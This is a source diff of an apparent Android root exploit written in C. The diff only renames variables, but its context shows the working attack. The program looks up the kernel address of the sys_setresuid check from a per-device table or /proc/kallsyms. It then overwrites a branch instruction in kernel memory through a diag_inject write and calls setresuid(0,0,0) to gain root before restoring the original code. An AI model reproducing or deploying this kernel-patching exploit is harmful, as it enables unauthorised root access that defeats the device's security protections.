@@ -30,7 +30,7 @@
 typedef struct _supported_device {
   const char *device;
   const char *build_id;
-  unsigned long int set_sysresuid_check_address;
+  unsigned long int set_sysresuid_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
@@ -48,7 +48,7 @@ static supported_device supported_devices[] = {
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
 static unsigned long int
-get_sys_setresuid_check_address_from_kallayms(void)
+get_sys_setresuid_address_from_kallayms(void)
 {
   FILE *fp;
   char function[BUFSIZ];
@@ -74,7 +74,7 @@ get_sys_setresuid_check_address_from_kallayms(void)
 }
 
 static unsigned long int
-get_sys_setresuid_check_addresses(void)
+get_sys_setresuid_addresses(void)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -86,60 +86,60 @@ get_sys_setresuid_check_addresses(void)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-      return supported_devices[i].set_sysresuid_check_address;
+      return supported_devices[i].set_sysresuid_address;
     }
   }
 
   printf("%s (%s) is not supported.\n", device, build_id);
   printf("Attempting to detect from /proc/kallsyms...\n");
 
-  return get_sys_setresuid_check_address_from_kallayms();
+  return get_sys_setresuid_address_from_kallayms();
 }
 
 static bool
 inject_command(const char *command,
-               unsigned long int sys_setresuid_check_address)
+               unsigned long int sys_setresuid_address)
 {
   struct diag_values injection_data;
 
-  injection_data.address = sys_setresuid_check_address;
+  injection_data.address = sys_setresuid_address;
   injection_data.value = command[0] | (command[1] << 8);
 
   return diag_inject(&injection_data, 1);
 }
 
 static bool
-break_sys_setresuid(unsigned long int sys_setresuid_check_address)
+break_sys_setresuid(unsigned long int sys_setresuid_address)
 {
   const char beq[] = { 0x00, 0x0a };
-  return inject_command(beq, sys_setresuid_check_address + 0x42);
+  return inject_command(beq, sys_setresuid_address + 0x42);
 }
 
 static bool
-restore_sys_setresuid(unsigned long int sys_setresuid_check_address)
+restore_sys_setresuid(unsigned long int sys_setresuid_address)
 {
   const char bne[] = { 0x00, 0x1a };
-  return inject_command(bne, sys_setresuid_check_address + 0x42);
+  return inject_command(bne, sys_setresuid_address + 0x42);
 }
 
 int
 main(int argc, char **argv)
 {
   int ret;
-  unsigned long int sys_setresuid_check_address;
+  unsigned long int sys_setresuid_address;
 
-  sys_setresuid_check_address = get_sys_setresuid_check_addresses();
-  if (!sys_setresuid_check_address) {
+  sys_setresuid_address = get_sys_setresuid_addresses();
+  if (!sys_setresuid_address) {
     exit(EXIT_FAILURE);
   }
 
-  ret = break_sys_setresuid(sys_setresuid_check_address);
+  ret = break_sys_setresuid(sys_setresuid_address);
   if (ret < 0) {
     exit(EXIT_FAILURE);
   }
 
   ret = setresuid(0, 0, 0);
-  restore_sys_setresuid(sys_setresuid_check_address);
+  restore_sys_setresuid(sys_setresuid_address);
 
   if (ret < 0) {
     printf("failed to get root access\n");
